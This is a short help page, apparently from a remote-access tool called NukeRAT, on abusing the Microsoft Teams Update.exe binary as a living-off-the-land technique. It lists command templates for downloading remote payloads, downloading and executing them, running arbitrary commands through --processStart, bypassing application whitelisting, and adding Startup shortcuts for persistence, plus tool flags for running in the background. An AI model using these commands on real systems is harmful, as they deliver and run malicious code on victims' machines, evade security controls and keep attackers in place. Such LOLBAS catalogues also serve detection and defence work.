ABOUT
    Binary to update the existing installed Nuget/squirrel package. Part
    of Microsoft Teams installation. LOLBAS covers downloading binary,
    downloading and execute binary, application Whitelisting Bypass, and
    executing binary.

USAGE:
    Update.exe --download {REMOTEURL}
    Update.exe --update={REMOTEURL}
    Update.exe --update={PATH_SMB:folder}
    Update.exe --updateRollback={REMOTEURL}
    Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
    Update.exe --updateRollback={PATH_SMB:folder}
    Update.exe --createShortcut={PATH:.exe} -l=Startup
    Update.exe --removeShortcut={PATH:.exe}-l=Startup

EXAMPLES:
    Update.exe --download {REMOTEURL}
    Update.exe --update={REMOTEURL}
    Update.exe --update={PATH_SMB:folder}
    Update.exe --updateRollback={REMOTEURL}
    Update.exe --processStart {PATH:.exe} --process-start-args "{CMD:args}"
    Update.exe --updateRollback={PATH_SMB:folder}
    Update.exe --createShortcut={PATH:.exe} -l=Startup
    Update.exe --removeShortcut={PATH:.exe}-l=Startup

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    Update.exe --download {REMOTEURL}
